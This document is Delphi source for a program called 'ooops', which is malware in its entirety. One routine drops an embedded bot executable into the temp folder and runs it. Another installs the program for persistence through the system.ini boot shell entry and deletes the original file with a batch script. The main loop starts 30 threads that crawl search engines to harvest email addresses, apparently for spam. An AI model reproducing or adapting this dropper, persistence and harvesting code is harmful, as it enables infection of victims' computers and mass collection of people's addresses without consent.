   program ooops;

   {$R *.res}
   {$R ebot.res}

   uses
     Windows,
     Winsock,
     ShellApi,
     untGoogleSearch in 'untGoogleSearch.pas',
     GetMail in 'GetMail.pas',
     StrList in 'StrList.pas';

   Const
     Google_NextButton : String = '<img src=/nav_next.gif width=100';
     Lycos_NextButton  : String = 'onclick="return kr(this,''wr'',''n'')"><b>Next</b>';
     MSN_NextButton    : String = '>Next</a></li>';

   Var
     G             : Integer;
     D             : Dword;
     FoundHTTP     : Array Of String;
     FoundHTTPCnt  : Integer;
     HTTPSearches  : Array [0..5] Of String =
                     ('http://www.google.com/search?q=',
                      'http://www.altavista.com/web/results?q=',
                      'http://search.yahoo.com/search?p=',
                      'http://search.lycos.com/default.asp?query=',
                      'http://search.msn.com/results.aspx?q=',
                      'http://google.icq.com/search/sitesearch.php?q=');

   Function ExistsFoundHTTP(Name: String): Bool;
   Var
     I: Integer;
   Begin
     Result := False;
     For I := 0 To FoundHTTPCnt -1 Do
       If FoundHTTP[I] = Name Then Result := True;
   End;

   Procedure AddFoundHTTP(Name: String);
   Var
     I: Integer;
   Begin
     If Name = '' Then Exit;
     For I := 0 To FoundHTTPCnt-1 Do
       If FoundHTTP[I] = Name Then Exit;

     Inc(FoundHTTPCnt, 1);
     SetLength(FoundHTTP, FoundHTTPCnt);
     FoundHTTP[FoundHTTPCnt-1] := Name;
   End;

   Procedure DropBot;
   Var
     TempDirBuff           :PChar;
     TempFileNameBuff      :PChar;
     ResultFilePath        :PChar;
     ResourcePointer       :PChar;
     ResourceLocation      :HRSRC;
     ResourceSize          :LongWord;
     BytesWritten          :LongWord;
     ResDataHandle         :THandle;
     FileHandle            :THandle;
   Begin
     GetMem(TempDirBuff, MAX_PATH + 1);
     GetMem(TempFileNameBuff, MAX_PATH + 1);

     GetTempPath(MAX_PATH + 1, TempDirBuff);
     GetTempFileName(TempDirBuff, '~EB', 0, TempFileNameBuff);

     ResultFilePath := pChar(Copy(TempFileNameBuff, 0, Length(TempFileNameBuff) - 3) + '.exe');

     FreeMem(TempDirBuff);
     FreeMem(TempFileNameBuff);

     ResourceLocation := FindResource(hInstance, pChar('ebot'), RT_RCDATA);
     If ResourceLocation = 0 Then Exit;

     ResourceSize := SizeOfResource(hInstance, ResourceLocation);
     If ResourceSize = 0 Then Exit;

     ResDataHandle := LoadResource(hInstance, ResourceLocation);
     If ResDataHandle = 0 Then Exit;

     ResourcePointer := LockResource(ResDataHandle);
     If ResourcePointer = NIL Then Exit;

     FileHandle := CreateFile(ResultFilePath, GENERIC_WRITE, FILE_SHARE_WRITE, NIL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
     If FileHandle = INVALID_HANDLE_VALUE Then Exit;

     WriteFile(FileHandle, ResourcePointer^, ResourceSize, BytesWritten, NIL);
     CloseHandle(FileHandle);

     ShellExecute(0, NIL, ResultFilePath, NIL, NIL, SW_SHOW);
   end;

   Procedure FindMailHTTP(HTTPName: String);
   Var
     J            : Integer;
     LinkList     : TStrList;
     Google_Source: String;
     HTTPDomain   : String;
     SubDomain    : String;
     TempStr      : String;
   Begin
     If (Pos('google', LowerCase(httpname)) = 0) and
        (Pos('altavista', LowerCase(httpname)) = 0) and
        (Pos('lycos', LowerCase(httpname)) = 0) and
        (Pos('msn', LowerCase(httpname)) = 0) and
        (Pos('icq', LowerCase(httpname)) = 0) and
        (Pos('yahoo', LowerCase(httpname)) = 0) Then
          If Not ExistsFoundHTTP(HTTPName) Then
            AddFoundHTTP(HTTPName)
          Else
            Exit;

     StripHTTP(HTTPName, HTTPDomain, SubDomain);
     Google_Source := GetSource(HTTPDomain, SubDomain);

     DoGatherText(Google_Source);
     ScanHTTP(Google_Source, LinkList);

     If LinkList.Count > 0 Then
       For J := 0 To LinkList.Count -1 Do
         FindMailHTTP(LinkList.Strings(J));

     If Pos(MSN_NextButton, Google_Source) > 0 Then
     Begin
       TempStr := Copy(Google_Source, 1, Pos(MSN_NextButton, Google_Source)-1);
       While Pos('<', TempStr) > 0 Do
         Delete(TempStr, 1, Pos('<', TempStr));
       Delete(TempStr, 1, Pos('"', TempStr));

       FindMailHTTP('http://search.msn.com/'+TempStr);
     End;

     If Pos(Lycos_NextButton, Google_Source) > 0 Then
     Begin
       TempStr := Copy(Google_Source, 1, Pos(Lycos_NextButton, Google_Source)-1);
       While Pos('<', TempStr) > 0 Do
         Delete(TempStr, 1, Pos('<', TempStr));
       Delete(TempStr, 1, Pos('"', TempStr));
       If TempStr[Length(TempStr)] = '"' Then
         Delete(TempStr, Length('http://search.lycos.com/'+TempStr), 1);

       FindMailHTTP(TempStr);
     End;

     If Pos(Google_NextButton, Google_Source) > 0 Then
     Begin
       TempStr := Copy(Google_Source, 1, Pos(Google_NextButton, Google_Source)-1);
       While Pos('<', TempStr) > 0 Do
         Delete(TempStr, 1, Pos('<', TempStr));
       Delete(TempStr, 1, Pos('/', TempStr));
       If TempStr[Length(TempStr)] = '>' Then
         Delete(TempStr, Length(TempStr), 1);

       FindMailHTTP('http://www.google.com/'+TempStr);
     End;
   End;

   Procedure StartScan;
   Var
     I: Integer;
   Begin
     While True Do
     Begin
       Randomize;
       Try
         FindMailHTTP(HTTPSearches[Random(6)]+MailSearch[Random(MailSearchCnt)]);
       Except
         ;
       End;
     End;
   End;

   Procedure Install;
   Var
     Dir:  Array[0..255]Of Char;
     Str:  String;
     Bat:  TextFile;
   Begin
     If CreateMutexA(NIL, FALSE, '--OOOPS--') = ERROR_ALREADY_EXISTS Then ExitProcess(0);

     GetSystemDirectory(Dir, 256);
     Str := String(Dir)+'\ooops.exe';
     copyfile(pchar(paramstr(0)), pchar(str), false);

     writeprivateprofilestring('boot','shell', 'Explorer.exe ooops.exe','system.ini');
     if paramstr(0) <> str then
     begin
       assignfile(bat, 'c:\ooops.bat');
       rewrite(bat);
       writeln(bat, 'del '+paramstr(0));
       writeln(bat, 'del c:\ooops.bat');
       writeln(bat, 'cls');
       writeln(bat, 'exit');
       closefile(bat);

       winexec('c:\ooops.bat', 0);
     end;
   End;

   begin
   {
     DropBot;
     Install;
   }
     AddMailSearch('@hotmail');
     AddMailSearch('@gmail');
     AddMailSearch('@yahoo');
     AddMailSearch('@msn');
     AddMailSearch('@icq');
     AddMailSearch('mailto%3A');
     AddMailSearch('mailto');
     AddMailSearch('mail');
     AddMailSearch('email');

     FoundHTTPCnt := 0;
     AddFoundHttp('');

     For G := 0 To {800}30 Do
     Begin
       CreateThread(NIL, 0, @StartScan, NIL, 0, D);
       Sleep(1000);
     End;

     StartScan;
   end.
